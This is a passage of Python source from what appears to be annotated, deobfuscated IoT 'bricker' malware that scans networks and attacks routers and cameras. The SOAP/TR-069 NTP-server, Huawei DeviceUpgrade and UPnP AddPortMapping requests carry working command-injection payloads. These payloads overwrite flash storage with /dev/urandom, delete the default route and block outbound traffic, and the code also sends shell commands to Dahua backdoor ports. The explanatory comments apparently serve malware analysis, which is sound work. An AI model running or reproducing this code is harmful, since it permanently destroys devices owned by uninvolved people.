# hash(socket.socket()) of target hosts. Values are job hash, or
# hash(hash(socket.socket())
requests_jobhash = {}

# Dictionary of incoming responses made to requests for SOAP, tr069, and Huawei
# GET requests. Keys are hash(socket.socket()). Values are the text of the
# target host responses.
requests_intext = {}

# Dictionary indicating whether requests were sent to request target hosts.
# Keys are hash(socket.socket()). Values are 0 or 1 indicating whether requests
# have been sent to target host.
requests_sent = {}

# Dictionary of HTTP requests to send to request target hosts. Keys are
# hash(socket.socket()). Values are HTTP request texts.
requests_requests = {}

# Dictionary containing time of connection to target host. Keys are
# hash(socket.socket()). Values are time of connection to target host.
requests_connecttime = {}

# List of target hashes of target hosts for SOAP, TR069, and Huawei GET request
# attacks. Items are hash((targetip, int(targetport)) of the targets.
requests_targethash = []

# Dictionary of target information for target hosts for SOAP, TR069, and Huawei
# GET requests. Keys are hash((targetip, int(targetport)). Values are
# targetip, int(targetport).
requests_ipport = {}

# Dictionary containing index to be used for makerequest(). The index is used in
# makerequest() to choose from one of several request texts. Keys are
# hash(targetip, int(targetport)). Values are an index number.
requestidx = {}

# Dictionary containing initial lines of responses to GET requests, ie the
# first lines to responses in requests_intext[]. Keys are hash(socket.socket())
# and values are the initial lines of the response.
requests_intext_init = {}

# Dictionary of times to run job. Keys are hash(ip, port). Values are time to
# run job.
jobtime = {}

# Dictinonary of sockets for SOAP, TR069, and Huawei attacks. Keys are
# hash((targetip, int(targetport)). Values are socket.socket() objects of the
# connections to the target host.
requests_s = {}

SOAPheader = 'POST /UD/act?1 HTTP/1.1\r\n' \
           'Host: 127.0.0.1:%d\r\n' \
           'User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n' \
           'SOAPAction: urn:dslforum-org:service:Time:1#SetNTPServers\r\n' \
           'Content-Type: text/xml\r\nContent-Length: %d\r\n\r\n'
SOAPprefix = '<?xml version="1.0"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><u:SetNTPServers xmlns:u="urn:dslforum-org:service:Time:1"><NewNTPServer1>`'
SOAPpostfix1 = '`</NewNTPServer1><NewNTPServer2></NewNTPServer2><NewNTPServer3></NewNTPServer3><NewNTPServer4></NewNTPServer4><NewNTPServer5></NewNTPServer5></u:SetNTPServers></SOAP-ENV:Body></SOAP-ENV:Envelope>'
SOAPpostfix2 = '`</NewNTPServer1><NewNTPServer2>`route del default`</NewNTPServer2><NewNTPServer3>`iptables -A OUTPUT -j DROP`</NewNTPServer3><NewNTPServer4></NewNTPServer4><NewNTPServer5></NewNTPServer5></u:SetNTPServers></SOAP-ENV:Body></SOAP-ENV:Envelope>'

tr069requests = [
 'busybox cat /dev/urandom >/dev/mtdblock0;busybox cat /dev/urandom >/dev/mtdblock1;busybox cat /dev/urandom >/dev/mtdblock2;busybox cat /dev/urandom >/dev/mtdblock3;busybox cat /dev/urandom >/dev/mtdblock4;busybox cat /dev/urandom >/dev/mtdblock5',
 'busybox cat /dev/urandom >/dev/mtdblock0;busybox cat /dev/urandom >/dev/mtdblock1;busybox cat /dev/urandom >/dev/mtdblock2;busybox cat /dev/urandom >/dev/mtdblock3;busybox cat /dev/urandom >/dev/mtdblock4;busybox cat /dev/urandom >/dev/mtdblock5 &',
 'cat /dev/urandom >/dev/mtdblock0;cat /dev/urandom >/dev/mtdblock1;cat /dev/urandom >/dev/mtdblock2;cat /dev/urandom >/dev/mtdblock3;cat /dev/urandom >/dev/mtdblock4;cat /dev/urandom >/dev/mtdblock5',
 ]

Huaweirequest = 'POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\nHost: %%TARGETIP%%:37215\r\nContent-Length: 601\r\nConnection: keep-alive\r\nAuthorization: Digest username="dslf-config", realm="HuaweiHomeGateway", nonce="88645cefb1f9ede0e336e3569d75ee30", uri="/ctrlt/DeviceUpgrade_1", response="3612f843a42db38f48f59d2a3597e19c", algorithm="MD5", qop="auth", nc=00000001, cnonce="248d1a2560100669"\r\n\r\n<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1"><NewStatusURL>$(/bin/busybox cat /dev/urandom >/dev/mtdblock0;/bin/busybox cat /dev/urandom >/dev/mtdblock3;/bin/busybox cat /dev/urandom >/dev/mtdblock1;/bin/busybox cat /dev/urandom >/dev/mtdblock2;/bin/busybox cat /dev/urandom >/dev/mtdblock4;/bin/iptables -A OUTPUT -j DROP)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>'

Huaweirequests = [
 'POST /picdesc.xml HTTP/1.1\r\nHost: %%TARGETIP%%:52869\r\nContent-Length: 866\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nConnection: keep-alive\r\n\r\n<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>%%RAND16A%%</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>%%RAND16B%%</NewInternalPort><NewInternalClient>`busybox cat /dev/urandom >/dev/mtdblock0;busybox cat /dev/urandom >/dev/mtdblock1;busybox cat /dev/urandom >/dev/mtdblock2;busybox cat /dev/urandom >/dev/mtdblock3;busybox cat /dev/urandom >/dev/mtdblock4;busybox cat /dev/urandom >/dev/mtdblock5;busybox cat /dev/urandom >/dev/mtdblock6`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>',
 'POST /picdesc.xml HTTP/1.1\r\nHost: %%TARGETIP%%:52869\r\nContent-Length: 873\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nConnection: keep-alive\r\n\r\n<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>%%RAND16A%%</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>%%RAND16B%%</NewInternalPort><NewInternalClient>`busybox cat /dev/urandom >/dev/mtdblock/0;busybox cat /dev/urandom >/dev/mtdblock/1;busybox cat /dev/urandom >/dev/mtdblock/2;busybox cat /dev/urandom >/dev/mtdblock/3;busybox cat /dev/urandom >/dev/mtdblock/4;busybox cat /dev/urandom >/dev/mtdblock/5;busybox cat /dev/urandom >/dev/mtdblock/6`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>',
  ]


def makerequest(targetport, index):
    """
    This function generates an HTTP GET request based on what appear to be SOAP,
    TR069, and Huawei vulnerabilities.

    Inputs:
        targetport: Port of the target host.
        index: Number used to select from one of several requests. Note that the
               same index numbers will beget the same requests.

    Outputs:
        None.

    Returns:
        None.
    """
    global SOAPprefix
    global tr069requests
    global SOAPpostfix1
    global SOAPpostfix2
    global SOAPheader
    global Huaweirequest

    if targetport == 37215:
        return Huaweirequest

    if targetport == 52869:
        return Huaweirequests[index % 3]

    if ('POST /UD/act/' in tr069requests[index] or
        'GET / HTTP' in tr069requests[index]
        ):
        return tr069requests[index]

    else:
        returnrequest = SOAPprefix
        returnrequest += tr069requests[index]
        if index < 5 or random.randint(0, 99) < 30:
            returnrequest += SOAPpostfix1
        else:
            returnrequest += SOAPpostfix2
        SOAPheaded = SOAPheader % (targetport, len(returnrequest))
        return SOAPheaded + returnrequest


def requests_init(targetip, targetport):
    """
    This function initiates a request target host, e.g. setting up values in
    requests_ipport[] and its socket in requests_s[].

    Inputs:
        targetip: IP of target host.
        targetport: Port of socket connection to target host.

    Outputs:
        Lists and dictionaries such as requests_ipport[], jobtime[],
        requestidx[], and requests_targethash[] are updated.

    Returns:
        None.
    """

    global config_eWP

    if not config_eWP:
        return

    s_target = (targetip, int(targetport))
    target_hash = hash(s_target)
    if target_hash in requests_targethash:
        return

    # Set random requestidx which is used to in makerequest() to select
    # HTTP requests. Note there are 23 items in tr069requests. ~20% probability
    # of choosing 9, 5, or 18 for requestidx.
    requestidx[target_hash] = 0
    randint = random.randint(0, 99)
    if randint < 20:
        requestidx[target_hash] = 9
    elif randint < 40:
        requestidx[target_hash] = 5
    elif randint < 60:
        requestidx[target_hash] = 18

    requests_ipport[target_hash] = (targetip, int(targetport))
    jobtime[target_hash] = 0
    requests_s[target_hash] = None
    requests_targethash.append(target_hash)


def connecttr069(targetip, targetport, request, jobhash):
    """
    This function connects to a target host to attempt the TR069, SOAP, and
    Huawei penetration GET requests.

    Inputs:
        targetip: IP of target host.
        targetport: Port of target host.
        request: GET request text returned from makerequest().
        jobhash: Hash(targetip, int(targetport)) of target socket connection.

    Outputs:
        Updates various lists and dictionaries of the target host, keyed by
        the socket or job hashes.

    Returns:
        s: socket.socket() object to the target host.
    """
    s_target = (targetip, int(targetport))

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setblocking(0)

    try:
        s.connect(s_target)
    except:
        pass

    if '%' in request:
        if '%%TARGETIP%%' in request:
            request = re.sub('%%TARGETIP%%', targetip, request)
        if '%%RAND16A%%' in request:
            request = re.sub('%%RAND16A%%',
                             '%d' % (random.uniform(10000, 65535)),
                             request)
        if '%%RAND16B%%' in request:
            request = re.sub('%%RAND16B%%',
                             '%d' % (random.uniform(10000, 65535)),
                             request)

    s_hash = hash(s)
    requestsocket_active.append(s)
    requesttarget_target[s_hash] = (targetip, int(targetport), request)
    requests_sent[s_hash] = 0
    requests_requests[s_hash] = request
    requests_intext[s_hash] = ''
    requests_connecttime[s_hash] = time.time()
    requests_jobhash[s_hash] = jobhash
    requests_s[jobhash] = s
    requests_intext_init[jobhash] = ''
    return s


def requestreset(webhash):
    """
    This function resets request target connecting. Note that it does not close
    the connection.

    Inputs:
        webhash: webhash of target host.

    Outputs:
        Lists and dictionaries such as requestidx[], requests_s[] are reset.
        
    Returns:
        None.
    """
    global config_sWP

    if config_sWP:
        printstatus("%s:%d TR:%s" % (requests_ipport[webhash][0],  # IP.
                                     requests_ipport[webhash][1],  # port.
                                     requests_intext_init[webhash]))

    requestidx[webhash] = None
    requests_ipport[webhash] = None
    jobtime[webhash] = None
    requests_s[webhash] = None
    requests_intext_init[webhash] = None
    requests_targethash.remove(webhash)


def requests_sockclose(sock):
    """
    This function resets a requests target host socket connection.

    Inputs:
        sock: Socket.socket() object of target host.

    Outputs:
        Lists and dictionaries such as requestsocket_active[] and
        requests_connecttime are reset.

    Returns:
        None.
    """
    global tr69client_maxattempts
    global timetowait_job
    global timetowait_set

    s_hash = hash(sock)
    jobhash = requests_jobhash[s_hash]

    try:
         sock.close()
    except:
        pass

    ssid_active = 0  # Not visibly used in this function.

    requests_intext_init[jobhash] = ''
    try:
        requests_intext_init[jobhash] = requests_intext[s_hash].split('\n')[0].strip()
    except:
        pass

    requestidx[jobhash] += 1

    timenow = time.time()
    if jobtime[jobhash] <= timenow:
        jobtime[jobhash] = time.time() + timetowait_job
    requests_s[jobhash] = None

    requestsocket_active.remove(sock)
    requesttarget_target[s_hash] = None
    requests_sent[s_hash] = None
    requests_requests[s_hash] = None
    requests_intext[s_hash] = None
    requests_connecttime[s_hash] = None
    requests_jobhash[s_hash] = None


def requests_sockconnect():
    """
    This function connects to requests target hosts, as listed in requests_s[].
    If it has timed out, the socket connection is 

    Inputs:
        None.

    Outputs:
        requests_s: Dictionary of socket connections to request target hosts.
        jobtime: Dictionary of job times.

    Returns:
        None.

    """

    global tr069requests

    timenow = time.time()
    targethashes = requests_targethash
    for targethash in targethashes:
        jobhash = hash(targethash)  # hash(hash(ip, port))??

        if requests_s[jobhash] == None:
            if requestidx[jobhash] >= len(tr069requests):
                requestreset(jobhash)
                continue

            if timenow >= jobtime[jobhash]:
                connectsock = connecttr069(requests_ipport[jobhash][0],  # IP
                                           requests_ipport[jobhash][1],  # port
                                           makerequest(requests_ipport[jobhash][1],
                                                       requestidx[jobhash]),
                                           jobhash)
                requests_s[jobhash] = connectsock
                jobtime[jobhash] = 0


def requests_sendrequest(sock, webhash, jobhash):
    """
    This function sends the attack requests, from requests_requests[], to the
    rest target host.

    Inputs:
        sock: Socket.socket() object of the request target host.
        webhash: hash(socket.socket()) of the request target host.
        jobhash: Unused.
        
    Outputs:
        None.
        
    Returns:
        None.
    """

    try:
        sock.send(requests_requests[webhash])
    except:
        pass

    return 1


def requests_attack():
    """
    This function attacks the request attack hosts.
    
    Inputs:
        None.

    Outputs:
        Various lists and dictionaries are updated as attack requests are sent,
        timing is managed, attacks retried, and connections may be closed.

    Returns:
        None.
    """
    global timetowait_set
    global tr69client_maxconnectiontime_payload

    timenow = time.time()

    timeout = 0.01
    sockreadyr, sockreadyw, noneready = select.select(requestsocket_active,
                                                      requestsocket_active,
                                                      [],
                                                      timeout)
    for s in requestsocket_active:
        s_hash = hash(s)
        s_opt = s.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR)
        if s_opt != 0:

            if requests_intext[s_hash] == '':
                requests_intext[s_hash] = '(timeout)'
            requests_sockclose(s)
            continue
        if s in sockreadyr:
            intext = ''
            try:
                intext = s.recv(2048)
            except:
                pass
            if intext:
                requests_intext[s_hash] += intext

                body_idx = requests_intext[s_hash].find('\r\n\r\n')
                if body_idx >= 0:
                    body_idx += 4
                else:
                    body_idx = requests_intext[s_hash].find('\n\n')
                    if body_idx >= 0:
                        body_idx += 2

                if body_idx >= 0:
                    regresult = re.search('Content-Length:\s*(\d+)',
                                          requests_intext[s_hash])
                    if regresult:
                        contentlength = int(regresult.group(1))

                        if len(requests_intext[s_hash]) - body_idx == contentlength:

                            requests_sockclose(s)
                            continue

            else:
                requests_sockclose(s)
                continue
        if s in sockreadyw:
            if requests_sent[s_hash] == 0:
                jobhash = requests_jobhash[s_hash]
                requests_sendrequest(s, s_hash, jobhash)
                requests_sent[s_hash] = 1

        timetowait = timetowait_set
        jobhash = requests_jobhash[s_hash]
        if timenow - requests_connecttime[s_hash] > timetowait:
            if requests_intext[s_hash] == '':
                requests_intext[s_hash] = '(timeout)'
            requests_sockclose(s)
            continue


O0O = "SPLTX"  # Not visibly used in this code.

# Dictionary containing number of incoming connections. Keys are local port
# number. Values are number of incoming connection attempts. Port 0 is a count
# of all incoming connections.
incoming_count = {}

# List containing ports that have had incoming connection attempts.
incoming_ports = []

# List of requests target ip:port.
requests_ipport = []

# Dictionary of incoming hosts, indicating whether a host has attempted an
# incoming connection. Keys are hash((ip, port)) of incoming host and local
# port. Values are 1 only.
incoming_ifhost = {}


def count_incoming(ip, port):
    """
    This function counts the number of incoming connections from remote hosts at
    a given port. It also tracks all connections as port 0.

    Inputs:
        ip: IP address of remote host.
        port: Port of local host being connected.
        
    Outputs:
        
    Returns:
        None.
    """
    global incoming_count
    global incoming_ports
    global incoming_ifhost
    global requests_ipport

    if port > 0:
        count_incoming(ip, 0)

    targethash = hash((ip, port))
    if targethash in incoming_ifhost:
        return

    incoming_ifhost[targethash] = 1

    if not port in incoming_ports:
        incoming_ports.append(port)
    if not port in incoming_count or incoming_count[port] == None:
        incoming_count[port] = 0
    if port:
        ipport = "%s:%d" % (ip, port)
        if not ipport in requests_ipport:
            requests_ipport.append(ipport)
    incoming_count[port] += 1


def print_incomingipport():
    """
    This function returns a string containing ip:port of incoming connections
    contained in requests_ipport[].

    Inputs:
        None.

    Outputs:
        None.

    Returns:
        String containing ip:port, separated by spaces.
    """

    global incoming_count
    global incoming_ports
    global incoming_ifhost
    global requests_ipport

    returnstring = 'INPST:'

    for listenport in incoming_ports:
        returnstring += ' %d:%d' % (listenport, incoming_count[listenport])
    return returnstring


def print_requestipport():
    """
        This function returns a string containing ip:port of request target
        hosts contained in requests_ipport[].

        Inputs:
            None.

        Outputs:
            None.

        Returns:
            String containing ip:port, separated by spaces.
    """

    global incoming_count
    global incoming_ports
    global incoming_ifhost
    global requests_ipport

    returnstring = 'INPSI:'
    for ipport in requests_ipport:
        returnstring += ' %s' % ipport
    return returnstring


def reset_incoming():
    """
    This function resets tracking of incoming connections, i.e. clears out
    incoming_count[], incoming_ports[], requests_ipport[], and
    incoming_ifhost[].

    Inputs:
        None.

    Outputs:
        None.

    Returns:
        None.
    """


    global incoming_count
    global incoming_ports
    global incoming_ifhost
    global requests_ipport

    incoming_count = {}
    incoming_ports = []
    requests_ipport = []
    incoming_ifhost = {}


def addjob(newjob):  # job = (timetowait, hostname, port)
    """
    This function adds a new job into the jobslist list. Note that the jobslist
    should be ordered from larger to smaller time-to-waits. Then getjob()
    will pop() and return jobs with smaller job times.

    Note that this function tries to add the new jobs in cases where 1: jobslist
    is empty, 2: new job belongs at the beginning, 3: new job belongs at the
    end, 4: new job belongs inbetween. Case 4 is implemented using binary search
    algorithm.

    Inputs:
        newjob: A new job (timeotwait, hostname, port) to be added to jobslist.

    Outputs:
        jobslist is updated with the new job added.

    Returns:
        None.
    """

    newjob_timetowait = newjob[0]
    jobsN = len(jobslist)

    # If no jobs in jobslist, add the new job and quit.
    if jobsN == 0:
        jobslist.append(newjob)
        return

    # Jobs in jobslist should be sorted from latest time-to-wait to earliest
    # time-to-wait.

    # If first job in jobslist has earlier timeout time, add new job there.
    if jobslist[0][0] < newjob_timetowait:  # timetowait.
        jobslist.insert(0, newjob)
        return
    # If last job in jobslist has later timeout time, add new job there.
    if jobslist[jobsN - 1][0] > newjob_timetowait:  # timetowait.
        jobslist.append(newjob)
        return

    idx_job = 0
    idx_job_last = jobsN - 1

    while True:
        # If idx_job near end of jobslist, add new job as above (to the end
        # if last job has later timeout time and to the beginning otherwise).
        if idx_job_last - idx_job <= 1:
            if jobslist[idx_job][0] > newjob_timetowait:
                jobslist.insert(idx_job_last, newjob)
                return
            jobslist.insert(idx_job, newjob)
            return

        # Set idx_mid halfway between idx_job and idx_job_last.
        idx_mid = int((idx_job + idx_job_last) / 2)

        # If job at idx_mid has later time-to-wait than new job, set idx_job
        # there to keep looking.
        if jobslist[idx_mid][0] > newjob_timetowait:
            idx_job = idx_mid
        # If job at idx_mid has same time-to-wait as new job, insert there.
        else:
            if jobslist[idx_mid][0] == newjob_timetowait:
                jobslist.insert(idx_mid, newjob)
                return
            idx_job_last = idx_mid


def getjobs(timeval):
    """
    This function pops and returns all jobs from jobslist that have not
    timed out. Note that it starts with the earliest time outs. (see addjob()).

    Inputs:
        timeval: Job timeout time must be earlier than (current) timeval time.

    Outputs:
        Returned jobs are popped off of jobslist.

    Returns:
        Returns list of jobs that have not timed out.
    """

    returnjobs = []

    while len(jobslist) > 0 and jobslist[len(jobslist)-1][0] <= timeval:
        returnjobs.append(jobslist.pop())

    return returnjobs


def iIiI1III11():  # Function never visibly called.
    for idx in range(len(jobslist) - 1):
        if jobslist[idx][0] < jobslist[idx + 1][0]:
            return 1
    return 0


def addscanhosts(ip, port):  # port is not used.
    """
    This function adds targets to target_hosts to be used in later scans. The
    IP address is input, and ports come from the list port3 or are generated
    randomly.
    The global variable ignoreIP is not visible here, and it is not clear what
    IP should be ignored (maybe host self?).

    Inputs:
        ip: IP address of target host to scan.

    Outputs:
        target_hosts: List of target hosts, comprised of IP:port, is appended
                      to. Additional hosts may be appended randomly throughout
                      the list or just appended in blocks.

    Returns:
        None.
    """
    global ports_random

    global ignoreIP  # Not visible here.
    if ip == ignoreIP:
        return

    totalscans = port3scans * len(scanports) + ports_random

    # Interlace ports from list port3 evenly among target_hosts, then add
    # random ports.
    if len(target_hosts) >= totalscans:

        idx_offset = int(len(target_hosts) / totalscans) + 1
        totalscans = 0  # Reused variable name, but "target_host_idx" more apt?

        for idx_unused in range(port3scans):  # o0o=3
            for scanport in scanports:
                target_hosts.insert(totalscans, "%s:%d" % (ip, scanport))
                totalscans += idx_offset
        for idx_unused in range(ports_random):
            target_hosts.insert(totalscans, "%s:%d" % (ip, random.randint(1, 65535)))
            totalscans += idx_offset
    # Add random ports, then add ports from list port3.
    else:
        for idx_unused in range(ports_random):
            target_hosts.insert(0, "%s:%d" % (ip, random.randint(1, 65535)))
        for idx_unused in range(port3scans):
            for scanport in scanports:
                target_hosts.insert(0, "%s:%d" % (ip, scanport))


def addscanhost(ip, scanport):
    """
    This function adds a single target host to target_hosts to be used in later
    scans. The IP address and port are input. See also addscanhosts().
    The global variable ignoreIP is not visible here, and it is not clear what
    IP should be ignored (maybe host self?).

    Inputs:
        ip: IP address of target host to scan.
        scanport: The port of target host to scan.

    Outputs:
        target_hosts: List of target hosts, comprised of IP:port, is appended
                      to. It may be appended randomly throughout the list or
                      just appended to the end.

    Returns:
        None.
    """
    global ignoreIP  # Not visible here.
    if ip == ignoreIP:
        printstatus('NOTC: Ignoring sentinel IP %s' % ignoreIP)
        return

    totalscans = port3scans * len(scanports)

    if len(target_hosts) >= totalscans:
        idx_offset = int(len(target_hosts) / totalscans) + 1
        totalscans = 0
        target_hosts.insert(totalscans, "%s:%d" % (ip, scanport))

        totalscans += idx_offset
    else:
        target_hosts.insert(0, "%s:%d" % (ip, scanport))


def connecttotarget():
    """
    This function connects to a target from the top of the target_hosts list,
    populatin sock_active and target_active[]. Note it seems to add socket to
    sock_active list even if connection fails.

    Inputs:
        None.

    Outputs:
        Adds socket to sock_active list.

    Returns:
        None.
    """
    if not config_eSC:
        return

    if len(target_hosts) > 0:
        target_host = target_hosts.pop()  # IP:port
        IPport = target_host.split(':')
        incominghash = hash(target_host)
        if incominghash in target_noconnect:
            return
        s_target = (IPport[0], int(IPport[1]))

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setblocking(0)
        sockhash = hash(s)
        target_lastactiontime[sockhash] = time.time()

        try:
            s.connect(s_target)
        except:
            pass

        # If connect fails, it still adds to sock_active list?
        sock_active.append(s)
        target_active[sockhash] = target_host  # target_host = IP:port


def targets_resetattack(scansock):
    """
    This function closes the inputted socket connection and initializes or
    restages subsequent attacks.

    Inputs:
        scansock: Socket connection object which will be reset.

    Outputs:
        Lists and dictionaries such as target_active[], target_steps[] for the
        target will be initialized. Attack credentials may be restaged.

    Returns:
        None.
    """

    global config_sSD
    global config_sBL
    global config_sSO
    global config_sSR
    global config_eWP
    global config_eBR
    global portsSR

    try:
        scansock.close()
    except:
        pass

    sock_active.remove(scansock)
    sockhash = hash(scansock)

    if sockhash in target_steps and not target_steps[sockhash] == None:
        if (sockhash in http_intext and
                not http_intext[sockhash] == None and
                len(http_intext[sockhash]) > 2
            ):
            intext = re.sub('^!', '', http_intext[sockhash])
            intext = re.sub('\s\s+', ' ', intext)

            if sockhash in targets_p6719 and not targets_p6719[sockhash] == None:
                if config_sSD:
                    if config_sBL:
                        printstatus("%s SD:%s:%s" % (target_active[sockhash],
                                                     targets_p6719[sockhash],
                                                     intext[:32]))
                    else:
                        printstatus("%s SD:%s:%s" % (target_active[sockhash],
                                                     targets_p6719[sockhash],
                                                     intext[:2560]))

            else:
                target_host = target_active[sockhash].split(':')  # IP:port
                hostname = target_host[0]
                port = int(target_host[1])
                if config_sSR or port in portsSR:
                    printstatus("%s SR:%s" % (target_active[sockhash],
                                              intext[:512]))
                    if config_eWP:
                        initHTTPtarget(hostname,
                                       port,
                                       hostname + '%%%' + 'PORT:%d:' % (port) +
                                       intext[:1024])  # IP, port, bannerhint.
                        if (port == 5555 or
                                port == 7547 or
                                port == 37215 or
                                port == 52869 or
                                'Server: RomPager/4.07 UPnP/1.0' in intext
                            ):
                            requests_init(hostname, port)
                else:
                    if port == 37215 or port == 52869:
                        requests_init(hostname, port)

                    if config_eBR:
                        if (port != 6789 and
                                port != 19058 and
                                port != 37215 and
                                port != 52869
                            ):
                            if (not 'SSH' in intext[:10] and
                                    not ('FTP' in intext and
                                         '220' in intext) and
                                    not "RFB 004" in intext and
                                    not "220-FileZilla" in intext
                                ):
                                stage_credentials(hostname,
                                                  port,
                                                  'PORT:%d:' % (port) +
                                                  intext[:512])

            target_host = target_active[sockhash].split(':')  # [IP, port]
            if hash(target_host[0]) in targets_unknown:  # If IP in...
                jobs_targets.append(target_host)
        else:
            if config_sSO:
                printstatus("%s SO" % (target_active[sockhash]))

            target_host = target_active[sockhash].split(':')  # [IP, port]
            hostname = target_host[0]  # IP
            port = int(target_host[1])  # port
            if not port in portsHTTP:
                hostname_hash = hash(hostname)
                if (not hostname_hash in targets_unknown or
                        targets_unknown[hostname_hash] == None
                    ):
                    targets_unknown[hostname_hash] = 1

                    timenow = time.time()

                    # Add muiltple jobs for this target over next 4 hrs.
                    for waittime in delays:  # Delays 0.25, 0.5, 1, 2, 3, 4 hrs.
                        nexttime = timenow + waittime*60
                        newjob = (nexttime, hostname, port)
                        addjob(newjob)

    target_lastactiontime[sockhash] = None
    target_active[sockhash] = None
    target_steps[sockhash] = None
    http_intext[sockhash] = None
    targets_p6719[sockhash] = None


def targets_sendkill():
    """
    This function sends kill commands to host targets from target_active[],
    which gets its target host information from target_hosts[].

    Inputs:
        None.

    Outputs:
        None.

    Returns:
        None.
    """

    global attack_waittime
    global step2force_waittime

    timenow = time.time()
    s_active = sock_active
    if_s_active = 0

    sockreadyr, sockreadyw, noneready = select.select([], s_active, [], 0.01)

    for s in s_active:
        sockhash = hash(s)
        s_opt = s.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR)

        if s_opt != 0:
            targets_resetattack(s)
            continue

        if_s_active = 1

        if s in sockreadyw:
            if (not sockhash in target_steps or target_steps[sockhash] == None):
                try:
                    s.send("")
                except:
                    targets_resetattack(s)
                    continue

                target_steps[sockhash] = 1

                target_host = target_active[sockhash].split(':')
                hostname = target_host[0]
                port = int(target_host[1])

                if port in portsHTTP:
                    target_steps[sockhash] = 2
                    try:
                        s.send('GET / HTTP/1.1\r\nHost: %s\r\n\r\n' %
                               (hostname))
                    except:
                        pass
                elif port == 6789 or port == 19058:
                    target_steps[sockhash] = 2
                    try:
                        s.send('shell\n')
                    except:
                        pass

        intext = ''
        try:
            intext = s.recv(512)
        except:
            pass

        # Respond to IAC DO cmd with IAC WONT cmd, and respond to IAC WILL cmd
        # with IAC DONT cmd (e.g. SO #29509437).
        try:
            for banner_charrep in re.findall('\xff\xfd.', intext):
                s.send('\xff\xfc' + banner_charrep[2])
            for banner_objrep in re.findall('\xff\xfb.', intext):
                s.send('\xff\xfe' + banner_objrep[2])
        except:
            pass

        if intext:
            if (not sockhash in target_steps or
                    target_steps[sockhash] != 3
                ):
                target_noconnect[hash(target_active[sockhash])] = 1
            target_steps[sockhash] = 3

            intext = re.sub('\r?\n', ';', intext)
            intext = re.sub('[^A-Za-z0-9 \.,:;<>\(\)\[\]\-+%!@/#$=]', '', intext)
            if sockhash in http_intext and not http_intext[sockhash] == None:
                http_intext[sockhash] += intext
            else:
                http_intext[sockhash] = intext

            if not sockhash in targets_p6719 or targets_p6719[sockhash] == None:
                if ((re.search('BusyBox v.*#', http_intext[sockhash]) and not
                    'OpenWrt' in http_intext[sockhash]) or
                    'shell: ' in http_intext[sockhash]
                    ):
                    port = int(target_active[sockhash].split(':')[1])
                    if port == 6789 or port == 19058:
                        targets_p6719[sockhash] = "DahuaBackdoor"
                    else:
                        targets_p6719[sockhash] = "BusyBox"

                    try:
                        s.send(cmd_brick_busybox)
                    except:
                        pass

                    target_lastactiontime[sockhash] = time.time()

            http_intext_length = 512
            if sockhash in targets_p6719 and not targets_p6719[sockhash] == None:
                http_intext_length = 2560
            if len(http_intext[sockhash]) >= http_intext_length:
                targets_resetattack(s)
        else:
            if sockhash in target_steps and target_steps[sockhash] == 1:
                if timenow - target_lastactiontime[sockhash] > step2force_waittime:
                    target_steps[sockhash] = 2
                    hostname = target_active[sockhash].split(':')[0]
                    try:
                        s.send('GET / HTTP/1.1\r\nHost: %s\r\n\r\n' %
                               hostname)
                    except:
                        pass
            if timenow - target_lastactiontime[sockhash] > attack_waittime:
                targets_resetattack(s)


def Iii1iIi1i(data, key, encode=False, decode=False):
    """
    This encoder/decoder function is a function that is unused in this code.
    No other comments.
    """
    if decode:
        data = binascii.a2b_base64(data)
    i1i1IiIiIiii1iiiI = ''.join(chr(ord(x) ^ ord(y)) for
                                (x, y) in izip(data, cycle(key)))
    if encode:
        return binascii.b2a_base64(i1i1IiIiIiii1iiiI).strip()
    return i1i1IiIiIiii1iiiI


def loadconfigs():
    """
    This function reads Sentinel configuration file and settings for
    individual targets, loading attack hosts using addscanhost().

    Inputs:
        None.

    Outputs:
        Scan host lists may be updated, files may be deleted.

    Returns:
        None.
    """
    global time_startscript
    global systemRAM

    timenow = time.time()

    printstatus("STAT V: %d SCT: %d RSQ: %d BFJ: %d "
                "WPT: %d PUT: %d TRT: %d XMP: %d" % (STATV,
                                                     len(target_hosts),
                                                     len(jobslist),
                                                     len(targeted_hash),
                                                     len(HTTP_hashes),
                                                     int(timenow - time_startscript),
                                                     len(requests_targethash),
                                                     len(webtargets_hash)
                                                     )
                )

    reloadconfig = False
    try:
        if os.path.isfile('/tmp/system/update/sentinel.reload'):
            reloadconfig = True
            os.remove('/tmp/system/update/sentinel.reload')
    except:
        pass

    # If script starterd 17 hrs ago and no targets queued for attack, quit.
    # Presumably a parent process restarts it, as status is indicated as
